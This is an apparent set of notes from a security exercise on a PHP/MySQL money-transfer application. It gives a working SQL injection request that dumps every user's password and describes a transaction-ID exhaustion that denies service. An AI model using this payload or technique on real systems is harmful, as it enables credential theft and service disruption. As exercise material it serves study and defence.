## Ideas for possible attacks

### SQL injections

SQL injections are the most obvious attack vector, but it is also the first one that will probably be patched.

An example of a SQL injection can be found in [attacks/get_users.py](attacks/get_users.py) here is the injection:

```
GET /process.php?user='+UNION+SELECT+1,'',CONCAT(user,+'+-+',pass)+FROM+users%23&pass=lmao&amount=lmao&drop=balance
```

That will result in the following query:

```sql
select * from transfers where user='' UNION SELECT 1,'',CONCAT(user, ' - ',pass) FROM users#'
```

And will return all the users and their passwords.

### XSS

This application is vulnerable to XSS attacks but I don't see any way to exploit it in a meaningful way.

### Integer overflow in the transfer amount

The transfer amount is stored as an integer, so it is possible to overflow it and get a negative amount.

An integer in MySQL is 4 bytes long, since it is signed, the maximum value is 2^31-1, which is 2147483647.
While in PHP, an integer is 8 bytes long, so the maximum value is 2^63-1, which is 9223372036854775807.

In theory, with a value `x s.t. 2^31-1 < x < 2^63-1`, we should be able to bypass PHP's checks (`amount > 0`) and overflow the integer in the DBMS to insert a negative amount (and make it become a withdrawal).

But the DBMS is detecting the overflow and returning an error:

```
mysql> INSERT INTO transfers (user, amount) VALUES ('carlo', 2147483649);
ERROR 1264 (22003): Out of range value for column 'amount' at row 1
```

### Integer overflow in the transaction ID

THe transaction ID is stored as an `medium int`, which is 3 bytes long, so the maximum value is 2^23-1, which is 8388607.

The idea is to insert that many transactions in the databas and see what happens.

The problem is that our requests are rate limited to an average of 1 request per second, so it will take 8388607 seconds (~2330 hours) to insert that many transactions.

Out of curiosity, I tried anyway.

The result is effectively a denial of service, since the database is not able to insert any more transactions.